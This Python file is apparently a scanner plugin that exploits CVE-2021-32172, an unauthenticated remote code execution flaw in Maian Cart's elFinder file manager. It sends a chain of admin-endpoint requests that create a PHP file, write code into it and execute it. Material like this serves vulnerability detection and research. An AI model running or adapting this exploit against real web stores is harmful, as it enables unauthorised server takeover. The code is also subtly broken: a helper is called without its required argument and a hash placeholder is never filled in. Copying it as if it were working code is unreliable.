import requests
import random
import string


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Maian Cart 3.8 preauth RCE''',
        "description": '''A severe vulnerability has been kindly reported to me by security advisor DreyAnd. The issue concerns the elFinder file manager plugin in Maian Cart and it affects all versions from 3.0 to 3.8.''',
        "severity": "critical",
        "references": [
            "https://dreyand.github.io/maian-cart-rce/", 
            "https://github.com/DreyAnd/maian-cart-rce", 
            "https://www.maianscriptworld.co.uk/critical-updates", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-32172"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-32172",
            "cwe-id": "CWE-862"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "rce", "unauth", "maian"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    randstr = gen_randstr()
    randstr_1 = gen_randstr()
    try:
        url = format_url(url)

        path = """/admin/index.php?p=ajax-ops&op=elfinder&cmd=mkfile&name={randstr}.php&target=l1_Lw""".format(randstr=randstr)
        method = "GET"
        data = """"""
        headers = {'Accept': '*/*'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/admin/index.php?p=ajax-ops&op=elfinder"""
        method = "POST"
        data = """cmd=put&target={{hash}}&content=%3c%3fphp%20echo%20%22{randstr_1}%22%3b%20%3f%3e""".format(randstr_1=randstr_1)
        headers = {'Accept': 'application/json, text/javascript, /; q=0.01', 'Accept-Language': 'en-US,en;q=0.5', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/product-downloads/{randstr}.php""".format(randstr=randstr)
        method = "GET"
        data = """"""
        headers = {'Accept': '*/*'}
        resp2 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp2.status_code == 200 and randstr_1 in resp2.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url

def gen_randstr(length):
    return ''.join(random.sample(string.ascii_letters + string.digits, length))